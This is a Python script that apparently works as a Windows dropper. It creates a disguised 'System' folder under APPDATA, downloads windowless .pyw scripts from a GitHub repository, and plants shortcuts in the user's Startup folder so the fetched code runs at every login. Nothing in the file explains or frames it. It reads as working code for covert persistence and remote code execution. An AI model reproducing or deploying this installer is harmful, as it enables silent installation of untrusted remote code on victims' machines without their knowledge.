import urllib
import os
import shutil
import requests


def check_internet():
    erroe = 0
    url='http://www.google.com/'
    timeout=5
    try:
        _ = requests.get(url, timeout=timeout)
        return True
    except requests.ConnectionError:
        erroe = 1
    return False

def istnall():
    apdt = os.environ["APPDATA"]


    os.mkdir(apdt+"/System")
    os.mkdir(apdt+"/System/etc")
    path = apdt+"/System/"
    os.mkdir(path+"etc/exec")
    txt = open(path+"etc/info.txt", "w+").write('eve\n')


    if check_internet():
        ID = 'Cha3gKjb'
        idfle = open(path+"etc/"+ID+".txt","w+")
        idfile = open(path+"etc/id.txt", "w+")
        idfile.write(ID)

        with urllib.request.urlopen("https://raw.githubusercontent.com/denborg/shiny-giggle/master/sync.pyw") as response, open(path+"etc/sync.pyw", 'wb') as out_file:
            shutil.copyfileobj(response, out_file)

        with urllib.request.urlopen("https://raw.githubusercontent.com/denborg/shiny-giggle/master/script.pyw") as response, open(path+"script.pyw", 'wb') as out_file:
            shutil.copyfileobj(response, out_file)	

        with urllib.request.urlopen("https://github.com/denborg/shiny-giggle/releases/download/rel/script.pyw.lnk") as response, open(apdt+"/Microsoft/Windows/Start Menu/Programs/Startup/script.pyw.lnk", 'wb') as out_file:
            shutil.copyfileobj(response, out_file)
        
        with urllib.request.urlopen("https://github.com/denborg/shiny-giggle/releases/download/rel/sync.pyw.lnk") as response, open(apdt+"/Microsoft/Windows/Start Menu/Programs/Startup/sync.pyw.lnk", 'wb') as out_file:
            shutil.copyfileobj(response, out_file)

    else:
        print()
